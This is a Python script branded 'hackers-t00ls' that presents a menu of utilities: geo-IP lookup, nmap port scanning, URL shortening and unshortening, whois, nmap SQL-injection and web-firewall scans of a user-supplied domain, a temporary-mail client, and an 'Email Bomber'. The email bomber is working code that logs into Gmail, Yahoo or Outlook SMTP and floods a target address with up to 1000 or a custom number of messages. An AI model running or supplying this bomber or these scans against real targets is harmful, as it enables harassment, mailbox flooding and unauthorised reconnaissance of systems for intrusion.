#################################################--import libraries and install if not installed--#################################################
import subprocess, platform, urllib.request, random, string, time, sys, os, re, smtplib, sys

try:
    import pyfiglet, urllib.request as urllib2, json, pprint, nmap, whois, pyperclip, requests, pyshorteners as ps
    from tld import get_tld
except ModuleNotFoundError:
    print("modules are not installed")
    os.system("pip install pyfiglet pyperclip requests python-whois tld python-nmap==0.6.1 pyshorteners==1.0.1")

if platform.system() == 'Windows':
    os.system("cls")
else:
    os.system("clear")

ascii_banner = pyfiglet.figlet_format("hackers-t00ls")
print(ascii_banner)
print("					By CxllZ")

ans=True
while ans:
    print ("""
    Make sure to turn off VPN, if using Nmap options\n    and make sure your connected to Internet for other options!\n    If You Get An Import Error Try Running The Script Again
    1. Geo Ip Lookup
    2. Port scan (NMAP)
    3. Url Backtracer
    4. Url shortener
    5. Whois
    6. SQLI Scanner (NMAP)
    7. WAF(WEB APP FIREWALL) Detection (NMAP)
    8. Temp Mail
    9. Email Bomber
    10. Exit/Quit
    """)
    ans=input("Choose Your T00l: ") 
    if ans=="1":
#################################################--GEO IP LOOKUP--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        ip = input("Enter Ip -->: ")
        url = "http://ip-api.com/json/"+ip+"?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        response = urllib2.urlopen(url)
        data = response.read()
        values = json.loads(data)
        print("NOT ACCURATE AS ALWAYS!")
        pprint.pprint(values)
        print("NOT ACCURATE AS ALWAYS!")
    elif ans=="2":
#################################################--NMAP PORT SCAN AND SET NMAP TO PATH--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        answer = None 
        while answer not in ("yes", "no"):
            print("Do You Have Nmap Installed?")
            answer = input("Enter yes or no: ") 
            if answer == "yes": 
                if platform.system() == 'Windows':
                    set_path = 'setx PATH "%PATH%;C:\\Program Files (x86)\\Nmap"'
                    os.system(set_path)
                    print("Finished Setting Nmap To PATH")
                    print()
                    print("If you get an error open another cmd/terminal and execute python script")
                    ip = input ("IP Target -->: ")
                    print ("nmap is scanning ip for open ports please be patient")
                    print("Waiting for too long?, hit any key")
                    print ()
                    nm = nmap.PortScanner()
                    nm.scan(ip, '0-1024')
                    for host in nm.all_hosts():
                        print('----------------------------------------------------')
                        print('Host : {} ({})'.format(ip, nm[ip].hostname()))
                        print('State : {}'.format(nm[ip].state()))
                        for proto in nm[ip].all_protocols():
                            print('----------')
                            print('Protocol : {}'.format(proto))
                            lport = nm[ip][proto].keys()
                            for port in lport:
                                print ('port : {}\tstate : {}'.format(port, nm[ip][proto][port]['state']))
                else:
                    print("If you get an error open another cmd/terminal and execute python script")
                    ip = input ("IP Target -->: ")
                    print ("nmap is scanning ip for open ports please be patient")
                    print("Waiting for too long?, hit any key")
                    print ()
                    nm = nmap.PortScanner()
                    nm.scan(ip, '0-1024')
                    for host in nm.all_hosts():
                        print('----------------------------------------------------')
                        print('Host : {} ({})'.format(ip, nm[ip].hostname()))
                        print('State : {}'.format(nm[ip].state()))
                        for proto in nm[ip].all_protocols():
                            print('----------')
                            print('Protocol : {}'.format(proto))
                            lport = nm[ip][proto].keys()
                            for port in lport:
                                print ('port : {}\tstate : {}'.format(port, nm[ip][proto][port]['state']))
            elif answer == "no":
                print("")
                print("Install Nmap Here!:")
                print("Windows: https://nmap.org/dist/nmap-7.91-setup.exe")
                print("Mac Os: https://nmap.org/dist/nmap-7.91.dmg")
            else: 
    	        print("Please enter yes or no.") 
    elif ans=="3":
#################################################--URL BACKTRACER--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        link = input("Enter Url Here -->: ")
        a = urllib.request.urlopen(link)
        print()
        print("Short Url Goes To:",  a.url)
    elif ans=="4":
#################################################--URL SHORTENER--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        link = input("Enter Url You Wish To Shorten -->: ")
        output = ps.Shortener().tinyurl.short(link)
        print(output)
    elif ans=="5":
#################################################--URL WHOIS--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        host = input("Enter Url To Whois(example.com) -->: ")
        print("Got An Error Try Running pip uninstall whois\n then pip install python-whois")
        print(whois.whois(host))
    elif ans=="6":
######################################--SQLI SCANNER--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        print("Do You Have Nmap Installed?")
        answer1 = input("Enter yes or no: ") 
        if answer1 == "yes": 
            if platform.system() == 'Windows':
                set_path = 'setx PATH "%PATH%;C:\\Program Files (x86)\\Nmap"'
                os.system(set_path)
                print("Finished Setting Nmap To PATH")
                print("If you get an error open another cmd/terminal and execute python script")
                w = input("Enter Top-Level-Domain Url To SQLI Scan(example.com) -->: ")
                print ("nmap is scanning ip for SQLI please be patient")
                print("Waiting for too long?, hit any key")
                print ()
                subprocess.call(['nmap', '--script', 'http-sql-injection', w])
                print("If No Results It Has No SQLI Vulnerabilites")
            else:
                print("If you get an error open another cmd/terminal and execute python script")
                w = input("Enter  Top-Level-Domain Url To SQLI Scan(example.com) -->: ")
                print ("nmap is scanning ip for SQLI please be patient")
                print("Waiting for too long?, hit any key")
                print ()
                subprocess.call(['nmap', '--script', 'http-sql-injection', w])
                print("If No Results It Has No SQLI Vulnerabilites")
        elif answer1 == "no":
            print("")
            print("Install Nmap Here!:")
            print("Windows: https://nmap.org/dist/nmap-7.91-setup.exe")
            print("Mac Os: https://nmap.org/dist/nmap-7.91.dmg")
        else: 
    	    print("Please enter yes or no.")
    elif ans=="7":
######################################--WAF(WEB APP FIREWALL) DETECTOR--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        print("Do You Have Nmap Installed?")
        answer2 = input("Enter yes or no: ") 
        if answer2 == "yes": 
            if platform.system() == 'Windows':
                set_path = 'setx PATH "%PATH%;C:\\Program Files (x86)\\Nmap"'
                os.system(set_path)
                print("Finished Setting Nmap To PATH")
                print("If you get an error open another cmd/terminal and execute python script")
                w = input("Enter Top-Level-Domain Url To WAF Detect(example.com) -->: ")
                print ("nmap is scanning url for waf's please be patient")
                print("Waiting for too long?, hit any key")
                subprocess.call(['nmap', '--script', 'http-waf-detect,http-waf-fingerprint', w])
                print("If No Results It Has No WAF")
            else:
                print("If you get an error open another cmd/terminal and execute python script")
                w = input("Enter Top-Level-Domain Url To WAF Detect(http://example.com) -->: ")
                print ("nmap is scanning url for waf's please be patient")
                print("Waiting for too long?, hit any key")
                print ()
                subprocess.call(['nmap', '--script', 'http-waf-detect,http-waf-fingerprint', w])
                print("If No Results It Has No WAF")
        elif answer2 == "no":
            print("")
            print("Install Nmap Here!:")
            print("Windows: https://nmap.org/dist/nmap-7.91-setup.exe")
            print("Mac Os: https://nmap.org/dist/nmap-7.91.dmg")
        else: 
    	    print("Please enter yes or no.")
    elif ans=="8":
######################################--TEMP-FAKE MAIL--#################################################
        API = 'https://www.1secmail.com/api/v1/'
        domainList = ['1secmail.com', '1secmail.net', '1secmail.org']
        domain = random.choice(domainList)
        def generateUserName():
            name = string.ascii_lowercase + string.digits
            username = ''.join(random.choice(name) for i in range(10))
            return username
        def extract():
            getUserName = re.search(r'login=(.*)&',newMail).group(1)
            getDomain = re.search(r'domain=(.*)', newMail).group(1)
            return [getUserName, getDomain]
        def print_statusline(msg: str):
            last_msg_length = len(print_statusline.last_msg) if hasattr(print_statusline, 'last_msg') else 0
            print(' ' * last_msg_length, end='\r')
            print(msg, end='\r')
            sys.stdout.flush()
            print_statusline.last_msg = msg
        def checkMails():
            reqLink = f'{API}?action=getMessages&login={extract()[0]}&domain={extract()[1]}'
            req = requests.get(reqLink).json()
            length = len(req)
            if length == 0:
                print_statusline("Your mailbox is empty. Hold tight. Mailbox is refreshed automatically every 5 seconds.")
            else:
                idList = []
                for i in req:
                    for k,v in i.items():
                        if k == 'id':
                            mailId = v
                            idList.append(mailId)
                x = 'mails' if length > 1 else 'mail'
                print_statusline(f"You received {length} {x}. (Mailbox is refreshed automatically every 5 seconds.)")
                current_directory = os.getcwd()
                final_directory = os.path.join(current_directory, r'All Mails')
                if not os.path.exists(final_directory):
                    os.makedirs(final_directory)
                for i in idList:
                    msgRead = f'{API}?action=readMessage&login={extract()[0]}&domain={extract()[1]}&id={i}'
                    req = requests.get(msgRead).json()
                    for k,v in req.items():
                        if k == 'from':
                            sender = v
                        if k == 'subject':
                            subject = v
                        if k == 'date':
                            date = v
                        if k == 'textBody':
                            content = v
                    mail_file_path = os.path.join(final_directory, f'{i}.txt')
                    with open(mail_file_path,'w') as file:
                        file.write("Sender: " + sender + '\n' + "To: " + mail + '\n' + "Subject: " + subject + '\n' + "Date: " + date + '\n' + "Content: " + content + '\n')
        newMail = f"{API}?login={generateUserName()}&domain={domain}"
        reqMail = requests.get(newMail)
        mail = f"{extract()[0]}@{extract()[1]}"
        pyperclip.copy(mail)
        print("\nYour temporary email is " + mail + " (Email address copied to clipboard.)" + "\n")
        print(f"Inbox of {mail}\n")
        while True:
            checkMails()
            time.sleep(5)
    elif ans=="9":
######################################--EMAIL BOMBER--#################################################
        print("If you are using a GMAIL or YAHOO account, you will need to change the settings to\n"'Less Secure Apps'" to allow python to send email using there servers,\n also may need to do that for OUTLOOK, or anyother EMAIL SERVER you use.... You may have to check.")
        print()
        class Email_Bomber:
            count = 0
            def __init__(self):
                try:
                    self.target = str(input('Enter target email <: '))
                    self.mode = int(input('Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
                    if int(self.mode) > int(4) or int(self.mode) < int(1):
                        print('ERROR: Invalid Option. GoodBye.')
                        sys.exit(1)
                except Exception as e:
                    print(f'ERROR: {e}')
            def bomb(self):
                try:
                    print()
                    self.amount = None
                    if self.mode == int(1):
                        self.amount = int(1000)
                    elif self.mode == int(2):
                        self.amount = int(500)
                    elif self.mode == int(3):
                        self.amount = int(250)
                    else:
                        self.amount = int(input('Choose a CUSTOM amount <: '))
                    print(f'\n You have selected BOMB mode: {self.mode} and {self.amount} emails ')
                except Exception as e:
                    print(f'ERROR: {e}')
            def email(self):
                try:
                    print()
                    self.server = str(input('Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
                    premade = ['1', '2', '3']
                    default_port = True
                    if self.server not in premade:
                        default_port = False
                        self.port = int(input('Enter port number <: '))

                    if default_port == True:
                        self.port = int(587)

                    if self.server == '1':
                        self.server = 'smtp.gmail.com'
                    elif self.server == '2':
                        self.server = 'smtp.mail.yahoo.com'
                    elif self.server == '3':
                        self.server = 'smtp-mail.outlook.com'

                    self.fromAddr = str(input('Enter from address <: '))
                    self.fromPwd = str(input('Enter from password <: '))
                    self.subject = str(input('Enter subject <: '))
                    self.message = str(input('Enter message <: '))

                    self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                    ''' % (self.fromAddr, self.target, self.subject, self.message)

                    self.s = smtplib.SMTP(self.server, self.port)
                    self.s.ehlo()
                    self.s.starttls()
                    self.s.ehlo()
                    self.s.login(self.fromAddr, self.fromPwd)
                except Exception as e:
                    print(f'ERROR: {e}')
            def send(self):
                try:
                    self.s.sendmail(self.fromAddr, self.target, self.msg)
                    self.count +=1
                    print(f'BOMB: {self.count}')
                except Exception as e:
                    print(f'ERROR: {e}')
            def attack(self):
                print('\n Bomb Starting')
                for email in range(self.amount+1):
                    self.send()
                self.s.close()
                print('\nfinished!')
                sys.exit(0)
        if __name__=='__main__':
            bomb = Email_Bomber()
            bomb.bomb()
            bomb.email()
            bomb.attack()
    elif ans=="10":
        exit()
    elif ans !="":
      print("\n Not A Valid Choice Try again") 
